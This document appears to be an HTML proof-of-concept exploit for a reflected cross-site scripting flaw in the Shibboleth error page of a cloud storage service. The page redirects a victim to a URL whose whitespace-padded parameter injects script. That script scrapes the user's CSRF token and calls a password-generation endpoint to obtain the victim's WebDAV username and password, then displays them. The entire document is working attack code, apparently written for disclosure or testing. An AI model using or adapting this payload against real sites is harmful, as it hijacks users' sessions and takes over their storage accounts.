<html>

<head>

</head>

<body>

<script>
window.location = "https://drive.surfcloud.nl/shiberror.php?now=                                                                                                                                                                                                                                 <?=urlencode('<script>
		document.write(\'<scr\'+\'ipt src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></scr\'+\'ipt>\');
		document.write(\'<div id="content" style="width:100%; height:100%; background-color:white; position:absolute; top:0;left:0; bottom:0;right:0;"><iframe src="https://drive.surfcloud.nl" style="position:fixed; top:0px; left:0px; bottom:0px; right:0px; width:100%; height:100%; border:none; margin:0; padding:0; overflow:hidden; z-index:999999;"></iframe></div>\');

		var stop = false;

		function h() {
			if (stop) {
				return;
			}

			$.get( "https://drive.surfcloud.nl/index.php/settings/personal", function( data ) {
				//alert(data);

				if (data.match(/data-requesttoken="(.*?)"/) == null) {
					return;
				}

				var user = data.match(/data-user="(.*?)"/)[1];
				var csrftoken = data.match(/data-requesttoken="(.*?)"/)[1];

				if (csrftoken == null) {
					return;
				}

				$.ajax({
				    url: "https://drive.surfcloud.nl/index.php/apps/user_shibboleth/get_new_password",
				    headers: {"requesttoken": csrftoken},
				    success: function(data) {
				    	stop = true;

				    	alert("WebDAV Username: " + user + "\nPassword: " + data.data[0] + " " + data.data[1] + " " + data.data[2]);
					}
				});

			});

			if (!stop) {
				setTimeout(h, 1000);
			}
		}

		setTimeout(h,300);

		</script>');?>";

</script>

</body>

</html>